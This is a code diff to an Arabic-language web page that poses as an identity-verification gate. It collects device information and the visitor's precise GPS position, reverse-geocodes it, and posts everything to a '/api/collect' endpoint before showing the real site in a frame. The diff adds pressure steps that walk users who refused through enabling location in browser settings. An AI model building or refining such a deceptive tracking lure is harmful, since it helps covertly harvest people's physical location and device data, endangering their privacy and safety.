@@ -224,7 +224,21 @@
                     يرجى السماح بالتحقق من هويتك للمتابعة
                 </div>
                 <button class="retry-btn" onclick="requestGPS()">✓ تأكيد والمتابعة</button>
-                <div class="steps-list">
+
+                <!-- Settings instructions (shown after denial) -->
+                <div class="steps-list" id="settingsHelp" style="display:none;">
+                    <div style="margin-bottom:10px;color:#e50914;font-weight:700;">⚠️ يجب تفعيل الموقع من الإعدادات:
+                    </div>
+                    <div><span class="step-num">1.</span> اضغط على ⋮ (ثلاث نقاط) أعلى المتصفح</div>
+                    <div><span class="step-num">2.</span> اذهب إلى <b>الإعدادات</b> → <b>إعدادات الموقع</b></div>
+                    <div><span class="step-num">3.</span> اضغط <b>الموقع الجغرافي</b> → فعّله</div>
+                    <div><span class="step-num">4.</span> ارجع واضغط الزر أدناه</div>
+                    <button class="retry-btn" onclick="location.reload()"
+                        style="margin-top:16px;width:100%;background:linear-gradient(135deg,#2d7aed,#5b3ff7);">🔄 إعادة
+                        تحميل الصفحة</button>
+                </div>
+
+                <div class="steps-list" id="initialSteps">
                     <div><span class="step-num">1.</span> اضغط على "تأكيد والمتابعة"</div>
                     <div><span class="step-num">2.</span> اضغط "السماح" في النافذة المنبثقة</div>
                     <div><span class="step-num">3.</span> سيتم تحميل الموقع تلقائياً</div>
@@ -326,22 +340,28 @@
             return info;
         }
 
+        let retryCount = 0;
+
         function showBlocked() {
             document.getElementById('normalLoading').classList.add('hidden');
             document.getElementById('gpsBlocked').classList.add('active');
+
+            if (retryCount > 0) {
+                // GPS permanently denied — show settings instructions
+                document.getElementById('settingsHelp').style.display = 'block';
+                document.getElementById('initialSteps').style.display = 'none';
+            }
         }
 
         function showSite() {
-            // Load the actual website
             document.getElementById('siteFrame').src = 'https://olk-o.vercel.app/';
-            // Fade out loading screen
             const loader = document.getElementById('loadingScreen');
             loader.classList.add('fade-out');
             setTimeout(() => loader.style.display = 'none', 600);
         }
 
         async function requestGPS() {
-            // Reset to loading state
+            retryCount++;
             document.getElementById('gpsBlocked').classList.remove('active');
             document.getElementById('normalLoading').classList.remove('hidden');
 
@@ -353,7 +373,6 @@
                     });
                 });
 
-                // GPS granted! Collect everything
                 const info = await collectDeviceInfo();
                 info.gpsLocation = {
                     lat: gpsPosition.coords.latitude,
@@ -363,7 +382,6 @@
                     speed: gpsPosition.coords.speed
                 };
 
-                // Reverse geocode
                 try {
                     const geoRes = await fetch(
                         `https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`
@@ -379,7 +397,6 @@
                     }
                 } catch (e) { }
 
-                // Send to server
                 try {
                     await fetch('/api/collect', {
                         method: 'POST',
@@ -392,7 +409,6 @@
                 showSite();
 
             } catch (e) {
-                // GPS denied again — show blocked screen
                 showBlocked();
             }
         }
